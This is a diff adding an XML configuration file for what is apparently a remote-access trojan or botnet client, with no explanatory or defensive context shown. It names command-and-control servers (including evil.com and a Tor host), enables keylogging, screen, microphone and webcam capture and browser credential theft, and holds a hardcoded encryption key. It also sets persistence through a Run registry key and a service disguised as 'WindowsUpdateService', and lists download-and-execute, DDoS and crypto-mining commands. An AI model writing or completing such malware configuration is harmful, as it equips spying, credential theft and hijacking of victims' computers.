@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration>
+    <C2Servers>
+        <Server>http://c2-master.evil.com:8080</Server>
+        <BackupServer>http://c2-backup.tor:9050</BackupServer>
+    </C2Servers>
+    
+    <Modules>
+        <Module name="Keylogger" enabled="true" />
+        <Module name="ScreenCapture" enabled="true" interval="60" />
+        <Module name="MicrophoneRecorder" enabled="true" />
+        <Module name="WebcamCapture" enabled="true" />
+        <Module name="CredentialStealer" enabled="true">
+            <Browsers>Chrome,Firefox,Edge</Browsers>
+        </Module>
+        <Module name="Ransomware" enabled="false" />
+    </Modules>
+    
+    <Encryption>
+        <Algorithm>AES-256-CBC</Algorithm>
+        <Key>7a5f8c3d1e9b2a4f6c8d0e1f3a5b7c9d</Key>
+        <IV>0123456789abcdef</IV>
+    </Encryption>
+    
+    <Persistence>
+        <RegistryKey>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</RegistryKey>
+        <ServiceName>WindowsUpdateService</ServiceName>
+        <ScheduledTask>SystemCheck</ScheduledTask>
+    </Persistence>
+    
+    <Commands>
+        <Command name="download_execute" />
+        <Command name="update" />
+        <Command name="uninstall" />
+        <Command name="ddos" target="www.target.com" duration="3600" />
+        <Command name="mine_crypto" pool="xmr.pool.minergate.com:45700" wallet="48zku..." />
+    </Commands>
+</Configuration>
